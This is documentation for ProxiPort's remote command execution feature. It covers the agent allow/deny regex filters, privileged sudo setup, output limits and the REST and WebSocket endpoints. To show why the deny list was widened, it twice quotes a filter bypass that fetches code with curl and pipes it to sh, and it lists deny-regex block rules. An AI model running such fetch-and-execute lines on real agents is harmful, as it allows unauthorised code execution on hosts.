# Command execution

ProxiPort can dispatch a command to one or many connected agents, stream
the output back, and record the result. The command travels through the
existing chisel control channel — no tunnel is opened, and no extra
port on the agent host is exposed.

For multi-line bodies and stored, reusable invocations, use
[scripts](scripts.md) instead. Note that the agent's `allow`/`deny`
filter applies to **commands only** — a script job runs the
operator-chosen interpreter without consulting it. See
[Authorising commands on the agent](#authorising-commands-on-the-agent).

## How it works

1. The operator (SPA, REST API, or a custom client) `POST`s a command
   body to `/api/v1/clients/<id>/commands` (single host) or
   `/api/v1/commands` (multi-host).
2. The server checks the user's `commands` permission and the per-client
   ACL, then forwards the body to the agent.
3. The agent matches the command against its
   [`[remote-commands]` allow/deny lists](https://github.com/proximile/proxiport/blob/main/proxiport.example.conf)
   and, if accepted, spawns the process under the agent's own OS
   account (`proxiport-agent` on a packaged or pairing install, unless
   the installer was given a different account; this is not the
   server's `proxiport` account).
4. The agent sends stdout/stderr and the final result back over the
   chisel channel, and the server stores the result in `jobs.db`. If
   the job was started over the `/api/v1/ws/commands` (or
   `/api/v1/ws/scripts`) WebSocket, the server also sends output chunks
   and the final result down that same socket. Other sockets cannot
   subscribe to the job. A job started over REST is not pushed
   anywhere: fetch its result from the job endpoint instead.

The job record keeps the status (`successful`, `failed`, or `unknown`
if the timeout passed before the process ended), `started_at` /
`finished_at`, the `pid`, `created_by` (the API user who submitted the
job), `error`, and `result.stdout` / `result.stderr`. There is no
separate exit-code field: a non-zero exit appears in `error` as text,
for example `exit status 1`. The record does not store the OS account
the process ran as.

## Single-host execution

```bash
CLIENT=alpha-prod
TOKEN=$(curl -s -u admin:password \
  https://proxiport.example.com/api/v1/login | jq -r .data.token)

JOB=$(curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-raw '{"command":"/usr/bin/uname -a","timeout_sec":10}' \
  "https://proxiport.example.com/api/v1/clients/$CLIENT/commands" \
  | jq -r .data.jid)

# Fetch the result once it completes
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://proxiport.example.com/api/v1/clients/$CLIENT/commands/$JOB" | jq
```

A representative response:

```json
{
  "data": {
    "jid": "f72b69fd-f418-40c3-ab62-4ce2c2022c58",
    "status": "successful",
    "client_id": "alpha-prod",
    "client_name": "alpha",
    "command": "/usr/bin/uname -a",
    "cwd": "",
    "is_sudo": false,
    "interpreter": "",
    "pid": 908526,
    "started_at": "2026-05-17T15:30:12.934Z",
    "finished_at": "2026-05-17T15:30:12.937Z",
    "created_by": "admin",
    "timeout_sec": 10,
    "multi_job_id": null,
    "schedule_id": null,
    "error": "",
    "is_script": false,
    "stream_result": false,
    "result": {
      "stdout": "Linux alpha 6.8.0-111-generic ...\n",
      "stderr": "",
      "summary": ""
    }
  }
}
```

`cwd` and `interpreter` echo the request values. When they are
omitted they come back empty, and the agent uses its default shell and
its own working directory.

`timeout_sec` is the agent's supervision window. If the process exceeds
it, the job is marked `unknown` but the process is not killed — that is
intentional, because killing a long-running migration mid-step is
usually worse than letting it finish unsupervised.

### Job body fields

| Field | Type | Notes |
| --- | --- | --- |
| `command` | string (required) | The command line to execute. Must satisfy the agent's allow/deny filter. |
| `timeout_sec` | int | Agent supervision timeout in seconds. If omitted or <= 0, the server's `[server] run_remote_cmd_timeout_sec` is used (60 unless changed). |
| `cwd` | string | Working directory on the agent. |
| `is_sudo` | bool | Run through `sudo -n` on Unix. Requires a NOPASSWD sudoers entry — see below. |
| `interpreter` | string | Optional. For command jobs only `cmd` or `powershell` is accepted (Windows agents); leave it empty to use the agent's default shell. Any other value, including an `[interpreter-aliases]` name or a path such as `/bin/bash`, is rejected with HTTP 400 "Invalid interpreter." To use another interpreter or an alias, send a script job (see [scripts](scripts.md)). |

## Multi-host execution

`POST /api/v1/commands` fans out a single command body to any combination
of client IDs and client-group IDs:

```bash
curl -s -X POST \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  --data-raw '{
    "command": "/usr/bin/uptime",
    "client_ids": ["alpha-prod", "bravo-staging"],
    "group_ids": ["edge-fleet"],
    "execute_concurrently": true,
    "abort_on_error": false,
    "timeout_sec": 30
  }' \
  https://proxiport.example.com/api/v1/commands
```

The response carries only the parent job ID:
`{"data":{"jid":"..."}}`. Poll `GET /api/v1/commands/<jid>` for the
rolled-up status. Its `jobs` array holds one child job per target
host. You can also list the child jobs with
`GET /api/v1/commands/<jid>/jobs`.

To get live stdout, start the command over the WebSocket endpoint
`/api/v1/ws/commands` instead: send the same JSON body as the first
message on the socket, and output and results stream back as each host
produces them. A job started with the REST POST cannot be attached to
over WebSocket afterwards.

Execution-flow flags:

`execute_concurrently`
: `false` by default — agents run in series, useful for migrations
  where one host must finish before the next starts. `true` fans the
  command out in parallel.

`abort_on_error`
: `true` by default in sequential mode — the first failure stops the
  rest. Ignored in concurrent mode. Set to `false` to keep going
  regardless.

For group IDs, define the group first via the
[client-groups API](client-groups-permissions.md).

## Authorising commands on the agent

Allowing arbitrary command execution from the API is not the default.
Each agent's
[`proxiport.conf`](https://github.com/proximile/proxiport/blob/main/proxiport.example.conf)
has a `[remote-commands]` block with an allow/deny filter:

```toml
[remote-commands]
  enabled = true
  allow = [
    '^/usr/bin/.*',
    '^/usr/local/bin/.*',
    '^C:\\Windows\\System32\\.*'
  ]
  deny = ['(\||<|>|;|,|\n|&|\$|`|\(|\)|\{|\})']
  order = ['allow', 'deny']
  send_back_limit = 4194304
```

The filter is applied to the **full command line as sent**. Two
practical consequences:

- The operator must invoke commands by absolute path. `uname -a` is
  not in `/usr/bin/.*` unless sent as `/usr/bin/uname -a`.
- Shell metacharacters are rejected by the default `deny` regex —
  pipes, redirects, `;`, `&&`, and also `$`, backtick, parentheses and
  braces. The command is written to a script file and run through the
  shell, so command substitution (`$(...)`, backticks) is a way out of
  the allow list by itself: `/usr/bin/env $(curl http://host/x|sh)`
  matches `^/usr/bin/.*` and executes something else entirely. Wrap
  multi-step work in a [script](scripts.md) instead.

!!! warning "The filter is defence in depth, not a boundary"

    `allow`/`deny` are regular expressions applied to a string that is
    then handed to a shell. Treat them as a way to keep honest
    operators inside the intended set, not as a control that contains a
    determined one. If an operator should not be able to run arbitrary
    code on a host, do not give them the `commands` permission and
    leave `[remote-commands] enabled = false` on that agent. Note also
    that the filter applies only to the command path: a `script` job
    runs an operator-chosen interpreter and skips the allow/deny check
    entirely, which is what `[remote-scripts] enabled` gates.

### Upgrading — the default `deny` changed in 0.9.0

`$`, backtick, `(`, `)`, `{` and `}` were added to the shipped default.
**This only affects agents that never set `deny` themselves** — an
explicit `deny` in `proxiport.conf` is used as written and is not
touched by an upgrade.

If you relied on the old default, commands that used a shell variable
or parentheses will now be rejected on that agent, for example:

```
/usr/bin/df -h $HOME
/usr/bin/systemctl show proxiport --property=(MainPID)
```

You have three options, in the order they are worth considering:

1. **Send an absolute, literal command.** `$HOME` expanded on the
   agent was never predictable from the operator's side anyway —
   `/usr/bin/df -h /home/someone` says what it means.
2. **Move the work into a [script](scripts.md).** Scripts are the
   supported way to run anything with shell structure in it; the
   allow/deny filter does not apply to them, and `[remote-scripts]
   enabled` is the switch that governs them.
3. **Set `deny` explicitly** to the old value if you have decided the
   risk is acceptable on that host:

    ```toml
    [remote-commands]
      deny = ['(\||<|>|;|,|\n|&)']
    ```

    Do this knowing what it allows: with the default `allow` of
    `^/usr/bin/.*`, `/usr/bin/env $(curl http://host/x|sh)` passes the
    filter and runs whatever the substitution fetches.

### Order semantics

`order = ['allow', 'deny']` (the default):

1. The command must match at least one `allow` regex.
2. If it also matches a `deny` regex, it is rejected.
3. Otherwise it is allowed.

`order = ['deny', 'allow']`:

1. If the command matches a `deny` regex, it is rejected **unless**
   it also matches an `allow` regex.
2. Anything that matches no regex at all is allowed.

The first order is "default deny", the second is "default allow".
Use the first one unless you have a specific reason.

### Examples

Allow anything under the standard binary dirs, plus command text that
itself starts with `sudo -n`:

```toml
allow = [
  '^/usr/bin/.*',
  '^/usr/local/bin/.*',
  '^sudo -n .*'
]
```

The filter checks the command text exactly as sent. With
`is_sudo: true` the agent adds `sudo -n` only after the filter has
passed, so `is_sudo` does not change what the filter sees, and you do
not need the `^sudo -n .*` entry for `is_sudo` commands:
`/usr/bin/systemctl restart nginx` sent with `is_sudo: true` is allowed
by `^/usr/bin/.*`. The `^sudo -n .*` entry only matters for commands
whose text literally starts with `sudo -n`, and it allows any path
after that prefix, so only your sudoers rules limit what such a
command can run.

Allow a single specific script:

```toml
allow = ['^/opt/site/maintenance.sh( |$)']
```

Allow batch files under a fixed directory on Windows:

```toml
allow = [
  '^C:\\Windows\\System32\\.*',
  '^C:\\Users\\Administrator\\scripts\\.*\\.bat'
]
```

This filters the command line of command jobs only. Jobs sent as
[scripts](scripts.md) skip `allow`/`deny` and are controlled by
`[remote-scripts]`.

## Sudo / privileged commands

The agent runs as an unprivileged user on Linux. On Windows, both the
`--service install` registration and the MSI install the service under
LocalSystem by default. That account is fully privileged, so every
command and script already runs with SYSTEM rights, and `is_sudo` has
no effect. On Windows the allow/deny filter is the only control on
commands, and it does not apply to scripts at all.

On Linux, `is_sudo: true` does not run your command text directly. The
agent writes the command to a temporary file under
`<data_dir>/scripts/` and runs
`sudo -n <interpreter> <data_dir>/scripts/<random-uuid>`. The
interpreter is the default shell (`/bin/sh`). If the command starts
with a shebang line, the agent runs
`sudo -n <data_dir>/scripts/<random-uuid>` instead. sudo sees only the
interpreter and the file path, never the command inside it, so a
sudoers rule cannot limit `is_sudo` to particular commands. Any rule
that lets it work, such as

```text
proxiport-agent ALL=(ALL) NOPASSWD: /bin/sh /var/lib/proxiport-agent/scripts/*
```

lets the agent run any command as root.

To give root to particular commands only, leave `is_sudo` off. Send
the command as `sudo -n /absolute/path args`, allow exactly that text
in `[remote-commands] allow`, and add a NOPASSWD sudoers rule scoped to
the same command:

```toml
[remote-commands]
  allow = [
    '^/usr/bin/.*',
    '^sudo -n /usr/bin/systemctl restart nginx$'
  ]
```

```text
# /etc/sudoers.d/proxiport-agent
proxiport-agent ALL=(ALL) NOPASSWD: /usr/bin/systemctl restart nginx
```

Avoid a blanket `proxiport-agent ALL=(ALL) NOPASSWD: ALL` — at that
point the allow/deny filter is the only thing standing between the API
and full root, and that filter does not apply to scripts at all.

Note that the Linux pairing installer's `-s` option (the **Give remote
scripts and commands sudo rights** checkbox in the pairing dialog)
creates exactly this blanket rule. It writes
`proxiport-agent ALL=(ALL) NOPASSWD:ALL` to
`/etc/sudoers.d/proxiport-all-cmd` (it leaves an existing file of that
name alone). If you enabled it, replace that file with a rule scoped to
the commands you need, as shown above, or delete it.

!!! warning "The agent's account changed in 0.10.0"

    The agent used to run as `proxiport`, which is now the **server's**
    account alone. A sudoers rule naming `proxiport` no longer applies
    to the agent — privileged commands will fail — and it grants those
    rights to the ProxiPort server instead, which is not what it was
    written for. The package upgrade prints a warning when it finds
    one. Rename the user in the rule, or remove it.

## Output size limits

The default `send_back_limit` is 4 MiB per stream. Output beyond the
limit is dropped. The job still reports what was captured, and its
`error` field says which stream overflowed, for example
`overflow of stdOut buffer: maximum send_back_limit of 4194304 bytes exceeded`
(stderr overflow is reported the same way as
`overflow of stdErr buffer: ...`). Raise the limit in
`[remote-commands]` if you need full output, or write the output to a
file on the agent and pull it back via a separate path.

## API surface

| Endpoint | Purpose |
| --- | --- |
| `POST /api/v1/clients/<id>/commands` | Run a command on one host |
| `GET  /api/v1/clients/<id>/commands` | List that host's command jobs |
| `GET  /api/v1/clients/<id>/commands/<jid>` | Single-host result |
| `POST /api/v1/commands` | Multi-host fan-out |
| `GET  /api/v1/commands` | List multi-host jobs |
| `GET  /api/v1/commands/<jid>` | Multi-host job summary |
| `GET  /api/v1/commands/<jid>/jobs` | Per-host results of a multi-host job |
| `GET` / `POST /api/v1/library/commands` | List / create stored commands |
| `GET` / `PUT` / `DELETE /api/v1/library/commands/<id>` | Read / update / delete a stored command |
| `WS   /api/v1/ws/commands` | Start a command on one or more clients over a WebSocket (send the request as the first message) and receive its output and results live |

See also: [scripts](scripts.md),
[client groups and permissions](client-groups-permissions.md),
[operator runbook — commands and scripts](operator-runbook.md#commands-and-scripts).
